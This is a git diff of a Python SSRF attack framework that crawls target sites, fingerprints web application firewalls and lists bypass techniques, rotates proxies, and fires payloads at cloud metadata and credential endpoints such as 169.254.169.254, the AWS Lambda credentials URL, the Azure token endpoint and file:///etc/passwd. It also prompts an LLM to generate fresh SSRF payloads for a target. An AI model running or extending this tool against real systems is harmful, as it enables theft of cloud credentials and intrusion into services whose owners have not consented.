@@ -1,24 +1,12 @@
 #!/usr/bin/env python3
-"""
-Ultimate SSRF Framework v4.2‑experimental – FULL WORKING VERSION
-Python 3.8+  |  github.com/KauanCosta2000/Ultimate-ssrf-Framework
-
-Improvements:
-- AI now actively used for payload generation & triage (if enabled)
-- gRPC phase enhanced with more endpoints and metadata checks
-- Discovery now includes real crawling of links/forms/scripts/iframes
-"""
-
 import asyncio, json, random, re, urllib.parse, os, sys, socket, argparse
 from dataclasses import dataclass, asdict
 from datetime import datetime
 from typing import List, Dict, Optional, Set, Tuple
 from collections import defaultdict
 from pathlib import Path
-
 from playwright.async_api import async_playwright, Response, Page
 
-# ---------- Optional dependencies ----------
 try:
     import aiohttp
     AIOHTTP_AVAILABLE = True
@@ -43,7 +31,6 @@ try:
 except ImportError:
     NETWORKX_AVAILABLE = False
 
-# ---------- ANSI ----------
 RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
 MAGENTA = "\033[95m"; CYAN = "\033[96m"; PURPLE = "\033[35m"; BOLD = "\033[1m"; DIM = "\033[2m"
 RESET = "\033[0m"; OK = f"{GREEN}[OK]{RESET}"; WARN = f"{YELLOW}[!]{RESET}"; FAIL = f"{RED}[X]{RESET}"
@@ -58,7 +45,6 @@ BANNER = f"""
 ╚════════════════════════════════════════════════════════════════╝
 {RESET}"""
 
-# ---------- Data Classes ----------
 @dataclass
 class SSRFEvidence:
     phase: str; technique: str; url: str; endpoint: str; param: str
@@ -72,7 +58,6 @@ class DiscoveredEndpoint:
     path: str; method: str; params: Set[str]
     accepts_url_param: bool; test_response_code: int; content_type: str
 
-# ---------- argparse ----------
 def setup_argparse():
     parser = argparse.ArgumentParser(description="Ultimate SSRF Framework v4.2-experimental",
                                      formatter_class=argparse.RawDescriptionHelpFormatter)
@@ -106,7 +91,6 @@ def setup_argparse():
     export_group.add_argument("--attack-map", action="store_true", help="Generate attack path graph (requires networkx)")
     return parser
 
-# ---------- Target Manager ----------
 class TargetManager:
     @staticmethod
     def from_args(args) -> List[str]:
@@ -137,7 +121,7 @@ class TargetManager:
                         c = TargetManager._clean(line)
                         if c: targets.append(c)
         except Exception as e:
-            print(f"{FAIL} File error: {e}")
+            print(f"{FAIL} Error reading target file '{path}': {e}")
             sys.exit(1)
         return targets
 
@@ -159,7 +143,6 @@ class TargetManager:
                 return TargetManager._from_file(input("File path: ").strip())
             print(f"{FAIL} Invalid option")
 
-# ---------- Proxy Manager (one proxy per scan) ----------
 class ProxyManager:
     def __init__(self, proxy_list: List[str] = None, proxy_type: str = "http"):
         self.list = proxy_list or []
@@ -177,7 +160,8 @@ class ProxyManager:
                     if line and not line.startswith('#'):
                         proxies.append(line)
         except Exception as e:
-            print(f"{FAIL} Proxy file error: {e}")
+            print(f"{FAIL} Error reading proxy file '{path}': {e}")
+            sys.exit(1)
         return cls(proxies, ptype)
 
     async def pick(self) -> Optional[str]:
@@ -187,7 +171,6 @@ class ProxyManager:
             self.idx += 1
             return p
 
-# ---------- LLM Client (full implementation) ----------
 class LLMClient:
     MODELS = {
         "claude": "claude-3-5-sonnet-20241022",
@@ -270,7 +253,6 @@ class AISkills:
         self.enabled = llm and llm.enabled
 
     async def generate_payloads(self, context: dict) -> List[str]:
-        """Generate creative payloads via LLM"""
         sys = "You are an SSRF expert. Generate 10 diverse SSRF payloads for the target. Return JSON array of strings."
         usr = f"Target: {context.get('target')}\nWAF: {context.get('waf','none')}\nCloud: {context.get('cloud','unknown')}\nEndpoints: {json.dumps(context.get('endpoints',[]))}"
         resp = await self.llm.generate(sys, usr)
@@ -281,7 +263,6 @@ class AISkills:
                     return json.loads(match.group())
             except:
                 pass
-        # fallback static payloads
         return [
             f"http://127.0.0.1/", f"http://169.254.169.254/latest/meta-data/",
             f"http://metadata.google.internal/", f"file:///etc/passwd",
@@ -290,19 +271,29 @@ class AISkills:
         ]
 
     async def triage(self, findings: List[dict]) -> Optional[str]:
-        """Ask LLM to analyze findings"""
         sys = "You are a senior security analyst. Provide a concise triage summary: most critical finding, overall risk, recommended next steps."
         usr = json.dumps(findings[:5], indent=2)
         return await self.llm.generate(sys, usr)
 
-# ---------- WAF Fingerprinter (full implementation) ----------
 class WAFFingerprinter:
     SIGNATURES = {
         "Cloudflare": {"headers":["cf-ray","__cfduid"],"cookies":["__cfduid","cf_clearance"],"body":["cloudflare"]},
-        "AWS WAF": {"headers":["x-amz-cf-id"],"cookies":[],"body":["request blocked"]},
-        # ... (abbreviated, full list from earlier)
+        "AWS WAF": {"headers":["x-amz-cf-id","x-amzn-requestid"],"cookies":[],"body":["request blocked"]},
+        "Akamai": {"headers":["x-akamai-transformed"],"cookies":["ak_bmsc"],"body":["akamai"]},
+        "Imperva": {"headers":["x-cdn","x-iinfo"],"cookies":["incap_ses_","visid_incap_"],"body":["incapsula"]},
+        "F5 BIG-IP": {"headers":["x-wa-info"],"cookies":["f5avr"],"body":["f5 networks"]},
+        "Sucuri": {"headers":["x-sucuri-id"],"cookies":["sucuri_cloudproxy_uuid"],"body":["sucuri"]},
+        "Fastly": {"headers":["fastly-debug-digest","x-served-by"],"cookies":[],"body":["fastly"]},
+        "Azure Front Door": {"headers":["x-azure-ref","x-ms-request-id"],"cookies":[],"body":["azure"]},
+        "Google Cloud Armor": {"headers":[],"cookies":[],"body":["google cloud armor"]},
+        "FortiWeb": {"headers":[],"cookies":["fortiwafsid"],"body":["fortiweb"]},
     }
-    BYPASS = {"Cloudflare":["DNS rebinding","IPv6 notation"]}
+    BYPASS = {
+        "Cloudflare":["DNS rebinding","IPv6 notation"],
+        "AWS WAF":["IMDSv1 downgrade","Alternative metadata IPs"],
+        "Imperva":["Double URL encoding","gopher:// protocol"],
+        "Akamai":["Origin IP discovery","DNS pinning"],
+    }
     def fingerprint(self, headers, body, cookies=None):
         cookies = cookies or {}
         headers_lower = {k.lower(): str(v).lower() for k,v in headers.items()}
@@ -330,7 +321,6 @@ class WAFFingerprinter:
                     "bypass_suggestions":self.BYPASS.get(sorted_results[0][0],[])}
         return {"detected":False,"primary":None,"confidence":0}
 
-# ---------- Main Framework ----------
 class UltimateSSRFFramework:
     def __init__(self, target, args):
         self.target = target
@@ -348,18 +338,16 @@ class UltimateSSRFFramework:
         self.no_k8s = args.no_k8s
         self.no_serverless = args.no_serverless
         self.no_ai = args.no_ai
-        self.export_nuclei = args.export_nuclei
-        self.export_siem = args.export_siem
-        self.export_json_api = args.export_json_api
-        self.attack_map = args.attack_map
+        self.do_export_nuclei = args.export_nuclei
+        self.do_export_siem = args.export_siem
+        self.do_export_json_api = args.export_json_api
+        self.do_attack_map = args.attack_map
 
-        # AI
         self.llm = None; self.ai = None
         if args.ai_provider and args.ai_provider != "none" and not self.no_ai:
             self.llm = LLMClient(args.ai_provider, args.ai_key, args.ai_model)
             if self.llm.enabled: self.ai = AISkills(self.llm)
 
-        # Results
         self.evidence: List[SSRFEvidence] = []
         self.endpoints: List[DiscoveredEndpoint] = []
         self.params: Set[str] = set()
@@ -368,7 +356,6 @@ class UltimateSSRFFramework:
         self.cloud = []
         self.internal_ips = set()
 
-        # Proxy
         self.proxy_mgr = None
         if args.proxy_file:
             self.proxy_mgr = ProxyManager.from_file(args.proxy_file, args.proxy_type)
@@ -386,14 +373,14 @@ class UltimateSSRFFramework:
 
     async def start(self):
         self.playwright = await async_playwright().start()
-        self.browser = await self.playwright.chromium.launch(headless=self.headless)
-        opts = {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+        launch_opts = {"headless": self.headless}
         if self.proxy_mgr:
             p = await self.proxy_mgr.pick()
             if p:
-                opts["proxy"] = {"server": p}
+                launch_opts["proxy"] = {"server": p}
                 if self.verbose: print(f"{CYAN}[PROXY]{RESET} {p}")
-        ctx = await self.browser.new_context(**opts)
+        self.browser = await self.playwright.chromium.launch(**launch_opts)
+        ctx = await self.browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         await ctx.route("**/*", self._intercept)
         self.page = await ctx.new_page()
 
@@ -495,97 +482,68 @@ class UltimateSSRFFramework:
                 print(f"  {col}[{f.severity.upper()}]{RESET} {ep.path} → {param} (impact {f.impact_score:.1f})")
         return bool(findings)
 
-    # ---------- Discovery (enhanced with crawling) ----------
     async def discover(self):
-        if self.verbose:
-            print(f"\n{CYAN}[DISCOVERY]{RESET} Crawling and extracting endpoints...")
-
-        # Static paths (fallback)
+        if self.verbose: print(f"\n{CYAN}[DISCOVERY]{RESET} Crawling and extracting endpoints...")
         static_paths = ["/","/api","/proxy","/fetch","/graphql","/health","/ws","/socket","/grpc","/k8s"]
         crawled_paths = set(static_paths)
-
-        # Crawl the main page for links, forms, scripts, iframes
         try:
             await self.page.goto(self.base, wait_until="networkidle", timeout=20000)
-            # Extract links from anchors, forms, scripts, iframes
             extracted = await self.page.evaluate("""() => {
                 const paths = new Set();
-                // Anchor hrefs
                 document.querySelectorAll('a[href]').forEach(a => {
                     try {
                         const u = new URL(a.href, document.baseURI);
                         if (u.origin === document.location.origin) paths.add(u.pathname + u.search);
                     } catch(e) {}
                 });
-                // Form actions
                 document.querySelectorAll('form[action]').forEach(f => {
                     try {
                         const u = new URL(f.action, document.baseURI);
                         if (u.origin === document.location.origin) paths.add(u.pathname);
                     } catch(e) {}
                 });
-                // Scripts
                 document.querySelectorAll('script[src]').forEach(s => {
                     try {
                         const u = new URL(s.src, document.baseURI);
                         if (u.origin === document.location.origin) paths.add(u.pathname);
                     } catch(e) {}
                 });
-                // Iframes
                 document.querySelectorAll('iframe[src]').forEach(i => {
                     try {
                         const u = new URL(i.src, document.baseURI);
                         if (u.origin === document.location.origin) paths.add(u.pathname);
                     } catch(e) {}
                 });
-                return Array.from(paths).slice(0, 50);  // limit
+                return Array.from(paths).slice(0, 50);
             }""")
             crawled_paths.update(extracted)
         except Exception as e:
-            if self.verbose:
-                print(f"  {WARN} Crawling error: {e}")
-
-        # Test each path
+            if self.verbose: print(f"  {WARN} Crawling error: {e}")
         for p in crawled_paths:
             try:
                 url = f"{self.base}{p}"
                 s, b, h = await self.request("GET", url, timeout=8000)
-                if s not in (0, 404, 403):
+                if s not in (0,404,403):
                     params = set(re.findall(r'[?&]([a-zA-Z_]\w*)=', p))
-                    # Also from body
                     params.update(re.findall(r'name=["\']([^"\']+)["\']', b, re.I))
-                    ep = DiscoveredEndpoint(
-                        path=p, method="GET", params=params,
-                        accepts_url_param=True, test_response_code=s,
-                        content_type=h.get("content-type", "")
-                    )
+                    ep = DiscoveredEndpoint(path=p, method="GET", params=params,
+                                            accepts_url_param=True, test_response_code=s,
+                                            content_type=h.get("content-type",""))
                     self.endpoints.append(ep)
-                    if self.verbose and s != 200:
-                        print(f"  {DIM}[{s}]{RESET} {p}")
-            except:
-                pass
+                    if self.verbose and s != 200: print(f"  {DIM}[{s}]{RESET} {p}")
+            except: pass
+        if self.verbose: print(f"  {OK} Found {len(self.endpoints)} endpoints")
 
-        if self.verbose:
-            print(f"  {OK} Found {len(self.endpoints)} endpoints")
-
-    # ---------- Cloud detection (fixed quiet output) ----------
     async def detect_cloud(self):
-        if self.no_waf: return
         if self.verbose: print(f"\n{CYAN}[CLOUD]{RESET} Detecting cloud provider...")
         s, b, h = await self.request("GET", self.base)
         body_low = b.lower()
-        indicators = {
-            "AWS": ["x-amz-request-id", "ec2"],
-            "GCP": ["x-goog-", "metadata.google.internal"],
-            "Azure": ["x-ms-request-id"],
-            "Alibaba": ["aliyungf"]
-        }
+        indicators = {"AWS":["x-amz-request-id","ec2"],"GCP":["x-goog-","metadata.google.internal"],
+                      "Azure":["x-ms-request-id"],"Alibaba":["aliyungf"]}
         self.cloud = [c for c, pats in indicators.items() if any(p in body_low or p in str(h).lower() for p in pats)]
         if self.verbose:
-            if self.cloud:
-                print(f"  {YELLOW}{', '.join(self.cloud)}{RESET}")
-            else:
-                print(f"  {OK} No specific cloud detected")
+            if self.cloud: print(f"  {YELLOW}{', '.join(self.cloud)}{RESET}")
+            else: print(f"  {OK} No specific cloud detected")
 
     async def basic(self):
         if self.verbose: print(f"\n{CYAN}[BASIC]{RESET} Testing common SSRF parameters...")
@@ -594,45 +552,23 @@ class UltimateSSRFFramework:
                 payload = f"http://{self.cb}/test-{random.randint(1000,9999)}"
                 await self.test_payload(ep, param, payload, "Basic", f"param {param}")
 
-    # ---------- AI-driven phases ----------
     async def run_ai_phases(self):
-        if not self.ai or not self.ai.enabled:
-            return
-        if self.verbose:
-            print(f"\n{PURPLE}[AI PHASES]{RESET} AI-powered analysis...")
-
-        # 1. Generate payloads
-        context = {
-            "target": self.target,
-            "waf": self.waf_info.get("primary",""),
-            "cloud": ",".join(self.cloud),
-            "endpoints": [e.path for e in self.endpoints[:5]]
-        }
+        if not self.ai or not self.ai.enabled: return
+        if self.verbose: print(f"\n{PURPLE}[AI PHASES]{RESET} AI-powered analysis...")
+        context = {"target":self.target,"waf":self.waf_info.get("primary",""),
+                   "cloud":",".join(self.cloud),"endpoints":[e.path for e in self.endpoints[:5]]}
         payloads = await self.ai.generate_payloads(context)
-        if payloads and self.verbose:
-            print(f"  {AI_ICON} Generated {len(payloads)} custom payloads")
-        # Test them on first endpoint
+        if payloads and self.verbose: print(f"  {AI_ICON} Generated {len(payloads)} custom payloads")
         if self.endpoints and payloads:
             ep = self.endpoints[0]
             param = list(ep.params)[0] if ep.params else "url"
             for pl in payloads[:5]:
                 await self.test_payload(ep, param, pl, "AI-Generated", "AI Payload")
-
-        # 2. Triage findings
         if self.evidence:
-            summary_data = []
-            for ev in self.evidence[:10]:
-                summary_data.append({
-                    "endpoint": ev.endpoint,
-                    "param": ev.param,
-                    "severity": ev.severity,
-                    "patterns": ev.matched_patterns[:2]
-                })
+            summary_data = [{"endpoint":ev.endpoint,"param":ev.param,"severity":ev.severity,"patterns":ev.matched_patterns[:2]} for ev in self.evidence[:10]]
             triage = await self.ai.triage(summary_data)
-            if triage and self.verbose:
-                print(f"  {AI_ICON} AI Triage:\n    {triage[:200]}...")
+            if triage and self.verbose: print(f"  {AI_ICON} AI Triage:\n    {triage[:200]}...")
 
-    # ---------- Experimental phases ----------
     async def phase_websocket(self):
         if self.no_ws: return
         if self.verbose: print(f"\n{PURPLE}[WebSocket SSRF (exp)]{RESET} Testing...")
@@ -645,12 +581,9 @@ class UltimateSSRFFramework:
     async def phase_grpc(self):
         if self.no_grpc or not AIOHTTP_AVAILABLE: return
         if self.verbose: print(f"\n{PURPLE}[gRPC SSRF (exp)]{RESET} Probing gRPC...")
-        # Test multiple endpoints
-        urls = [
-            "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
-            "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
-            "/grpc.health.v1.Health/Check"
-        ]
+        urls = ["/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
+                "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
+                "/grpc.health.v1.Health/Check"]
         old_count = len(self.callbacks)
         for path in urls:
             full_url = f"{self.base}{path}"
@@ -659,7 +592,6 @@ class UltimateSSRFFramework:
                     headers = {"Content-Type":"application/grpc","X-SSRF":f"http://{self.cb}/grpc-{random.randint(1000,9999)}"}
                     resp = await session.post(full_url, headers=headers, timeout=10)
                     body = await resp.text()
-                    # Check for metadata in response
                     if any(kw in body.lower() for kw in ["metadata","token","access_key"]):
                         ev = SSRFEvidence(phase="gRPC SSRF", technique="gRPC Response",
                                           url=full_url, endpoint=path, param="header", payload="X-SSRF",
@@ -694,18 +626,15 @@ class UltimateSSRFFramework:
     async def phase_serverless(self):
         if self.no_serverless: return
         if self.verbose: print(f"\n{PURPLE}[Serverless SSRF (exp)]{RESET} Testing...")
-        targets = {
-            "AWS Lambda": ["http://169.254.170.2/v1/credentials"],
-            "Azure Functions": ["http://169.254.169.254/metadata/identity/oauth2/token"],
-            "GCP Functions": ["http://metadata.google.internal/"]
-        }
+        targets = {"AWS Lambda":["http://169.254.170.2/v1/credentials"],
+                   "Azure Functions":["http://169.254.169.254/metadata/identity/oauth2/token"],
+                   "GCP Functions":["http://metadata.google.internal/"]}
         for ep in self.endpoints[:5]:
             for param in list(ep.params)[:3] + ["url"]:
                 for cloud, urls in targets.items():
                     for u in urls:
                         await self.test_payload(ep, param, u, "Serverless", f"{cloud}: {u}")
 
-    # ---------- Reporting ----------
     def _dedup(self):
         groups = defaultdict(lambda: {"findings":[], "max_sev":"info", "oob":0})
         sev_order = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
@@ -718,7 +647,7 @@ class UltimateSSRFFramework:
         return dict(groups)
 
     def export_nuclei(self):
-        if not self.export_nuclei: return
+        if not self.do_export_nuclei: return
         templates = []
         for ev in self.evidence:
             if ev.out_of_band_hit:
@@ -741,27 +670,33 @@ class UltimateSSRFFramework:
                 print(f"  {WARN} PyYAML missing, exported JSON")
 
     def export_siem_cef(self):
-        if not self.export_siem: return
+        if not self.do_export_siem: return
         entries = []
         for ev in self.evidence:
             cef = f"CEF:0|SSRFFramework|4.2|{ev.severity}|SSRF|{ev.severity}|"
             cef += f"endpoint={ev.endpoint} param={ev.param} outOfBand={ev.out_of_band_hit} score={ev.impact_score}"
             entries.append(cef)
-        with open(f"siem_{self.target}.cef","w") as f:
-            f.write("\n".join(entries))
-        if self.verbose: print(f"  {OK} CEF exported")
+        if entries:
+            with open(f"siem_{self.target}.cef","w") as f:
+                f.write("\n".join(entries))
+            if self.verbose: print(f"  {OK} CEF exported")
 
     def export_json_api(self):
-        if not self.export_json_api: return
-        data = {"target":self.target,"timestamp":datetime.now().isoformat(),
-                "cloud":self.cloud,"total_findings":len(self.evidence),
-                "unique_endpoints":self._dedup(),"callbacks":len(self.callbacks)}
+        if not self.do_export_json_api: return
+        data = {
+            "target": self.target,
+            "timestamp": datetime.now().isoformat(),
+            "cloud": self.cloud,
+            "total_findings": len(self.evidence),
+            "unique_findings": len(self._dedup()),
+            "callbacks": len(self.callbacks)
+        }
         with open(f"api_report_{self.target}.json","w") as f:
             json.dump(data, f, indent=2, default=str)
         if self.verbose: print(f"  {OK} JSON API exported")
 
     def generate_attack_map(self):
-        if not self.attack_map: return
+        if not self.do_attack_map: return
         if not NETWORKX_AVAILABLE:
             if self.verbose: print(f"{WARN} networkx missing")
             return
@@ -828,7 +763,6 @@ td{padding:8px;border-bottom:1px solid #333}
         print(f"\n  {DIM}Report: {self.html_file}{RESET}")
         print(f"  {DIM}Results: {self.json_file}{RESET}")
 
-    # ---------- Run ----------
     async def run(self):
         print(f"\n{BOLD}{'='*50}{RESET}")
         print(f"{BOLD}Target:{RESET} {self.target}")
@@ -863,17 +797,27 @@ td{padding:8px;border-bottom:1px solid #333}
         finally:
             await self.stop()
 
-# ---------- Main ----------
 async def main():
     parser = setup_argparse()
     args = parser.parse_args()
     print(BANNER)
+
     targets = TargetManager.from_args(args)
     if not targets:
         targets = TargetManager.interactive()
         if not targets:
             print(f"{FAIL} No targets.")
             return
+        if args.ai_provider is None:
+            enable_ai = input(f"{WARN} Enable AI? (none/claude/openai/ollama/gemini/mistral/deepseek) [none]: ").strip().lower()
+            if enable_ai and enable_ai != "none":
+                args.ai_provider = enable_ai
+                if enable_ai != "ollama":
+                    args.ai_key = input(f"{WARN} API key: ").strip()
+                model_choice = input(f"{WARN} Model (press Enter for default): ").strip()
+                if model_choice:
+                    args.ai_model = model_choice
+
     for i, t in enumerate(targets, 1):
         print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}]{RESET} Scanning: {t}")
         await UltimateSSRFFramework(t, args).run()
